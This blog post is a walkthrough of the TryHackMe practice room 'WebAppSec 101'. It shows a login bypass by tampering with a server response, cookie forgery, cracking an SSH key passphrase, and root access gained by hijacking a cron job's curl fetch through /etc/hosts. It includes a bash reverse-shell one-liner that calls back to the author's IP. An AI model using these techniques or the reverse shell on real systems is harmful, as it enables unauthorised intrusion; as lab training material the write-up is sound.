---
layout: post
published: false
title: "TryHackMe - WebAppSec 101 | Walkthrough"
date: 2020-07-26 14:32:20 +0300
description: WebAppSec101 room of Tryhackme | Writeups.
excerpt: "Walkthrough of WebAppSec 101 room - Tryhackme"
image: "https://jaiguptanick.github.io/Blog/images/WebAppSec101/WebAppSec101.png"
sitemap:
    priority: 0.8
    lastmod: 2020-07-26
    changefreq: monthly
---

<style>
/* This stylesheet sets the width of all images to 100%: */
img {
  width: 90%;
}
</style>

<h2 align="center" >WebAppSec 101 - Tryhackme Walkthrough </h2>
---
Here is a walkthrough of the [TryHackMe](https://tryhackme.com/) room “WebAppSec 101.” If you haven’t already completed the challenge, you can do so [here](https://tryhackme.com/room/webAppSec101).

>Hello, today we are going to solve an exciting room WebAppSec 101, which is quite different for me than other challenges. It is worth solving this room as it contains some essential Owasp Top 10 vulnerability, i.e Broken Authentication. Also, using some automated Privilege Escalation scripts like linpeas.sh makes it more interesting.

## Enumeration
---

<h3>Nmap</h3>

![WebAppSec 101 Walkthrough nmap]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/nmap.png)

As always starting with a nmap scan.Only two 22 with SSH and 80 with Http are open.Rest are filtered.Initially no clue on SSH so moving to Enumerate Http.

Simultaneously starting nikto scan till then but got nothing unusual.

![WebAppSec101Walkthrough nikto]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/nikto.png)

Moving to the main website:-

![WebAppSec101 writeup website]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/website.png)

This shows a normal webpage with some information about WebAppSec101 password manager.There are only two pages linked with homepage which seems usual,so starting a directory scan.

<h3>Dirsearch Scan</h3>

![WebAppSec101 room dirscan]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/dirsearch.png)

Directory scanning showed many pages but /admin/ seems interesting.

<h3>Logging In via Broken Authentication</h3>

![WebAppSec101]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/adminpage.png)

Now no clue on credentials, also brute-forcing is not the solution as mentioned in the hint.

Just enumerating the files associated with the source code shows us an exciting file named login.js containing the function used in the login form on the /admin page.

![WebAppSec101_tryhackme_logincode]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/logincode.png)

The function login() in the box is the vulnerable code that will let us bypass the login form. The variable creds take the credentials, and variable response sends them to /api/login for validation, and the statusOrCookie variable takes the response. Till here, everything seems perfect now in the Conditional statement; it checks if the response from the server is "Incorrect Credentials" then it will not allow access otherwise, it will set a cookie named "SessionToken" to statusOrCookie and redirect us to the admin panel. Here lies the vulnerability as a user can change the response of /api/login from "Incorrect Credentials" to anything else using BurpSuite and trick the server into running the else part of the code.<br>Lets see practically:-
<br>Intercepting request using burp:

![WebAppSec101 solution burpsuite]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/burp1.png)


Now, as we want to change the response, not the request so choosing Action > Do intercept > Response to the request.

![walkthrough_WebAppSec101_burp]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/doresponse.png)

Forwarding the request to get the response:

![writeup WebAppSec101 response]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/response1.png)

We get the response as expected now change it to anything else or delete "Incorrect Credentials" and again forward the request.
Now refresh the page to get the access.<br>
Wow! we got access to the page without the credentials.

![WebAppSec101 solutions]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/loggedin.png)

<h3><b>BONUS</b></h3>

---
There is an alternate method to login as the login.js is creating a cookie in case of successfully logging in.
We can manually create the cookie on the login page named "SessionToken" and assign it any value as there is no code to validate our cookie.

![WebAppSec101_tryhacme_cookies]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/cookie.png)

Refresh the page to successfully logging in.

![WebAppSec101]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/logged_via_cookie.png)


Now Moving to page provides majorly 2 information:
``` 
1.There is a user name james.
2.The ssh key to login via SSH.
```
Saving the Key to a file and reduce its permission using ```chmod 400 james.key ``` and then connecting via SSH:

![WebAppSec101]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/ssh_fail.png)

OHH!! It is asking for the passphrase for the provided key. As No passphrase is found.Now bruteforing is the only option.
using <b>ssh2john.py</b> to convert to hash that john can crack using rockyou.txt

![WebAppSec101_walkthrough]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/johncrack.png)

It successfully found the passphrase . Now we can log in via SSH.

![ssh_WebAppSec101]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/james_ssh_success.png)

Get the user flag and submit.

![WebAppSec101_flag]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/flag1.png)


<h3>Privilege Escalation</h3>

This part is really interesting as none of the manual methods worked.
``` 
1.Can't run sudo -l as don't know james password.
2.SUID bit can be cheched by "find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null " but are also not intersting.
```
Using automated Tools like linpeas.sh initially not helped until I saw the room tag mentioned "cron".

![WebAppSec101_root_curl]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/root_curl.png)

User root is connecting to a URL using curl, moving down to check more to results of linpeas shows writable access to file /etc/hosts which is usually only writable by root. 

![WebAppSec101_etc_hosts]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/etc.png)

Since curl is used by root so if we somehow exploit it we can get the root access.The curl command from cronjob is using a "WebAppSec101.thm" as hostname and we have write access to the hosts file. Meaning we can replace the hostname to make the cronjob think that the hostname is from our IP Address which will let it connect to our given IP address.

Lets do this practically:

![WebAppSec101_python_server]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec101/python_server.png)

```
1. We need to start a python server locally using "python3 -m http.server 80" choose port 80 as it is the default port.
2. Make the same directory as "/downloads/src/buildscript.sh" 
3. Finally a file named buildscript.sh with the reverse shell , i used it from pentestermonkey.net "bash -i >& /dev/tcp/10.9.19.190/1234 0>&1"
4.Now start a netcat listener locally to which the Box will connect.
5. At last replace the IP of the /etc/hosts of WebAppSec101.thm to our own connecting IP.
6. All done now wait a few seconds till it connects back to us via nc listener due to cronjob assigned.
```

![WebAppSec101_flag2]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/WebAppSec 101/flag2.png)

Finally, We got a connection from the Box as ROOT. It was really a nice room containing many fundamentals, an I enjoyed soving it and writing its walkthrough.





<br>
<br>

<i>Thanks for your patience,I hope you enjoyed reading. Happy Hacking... </i>
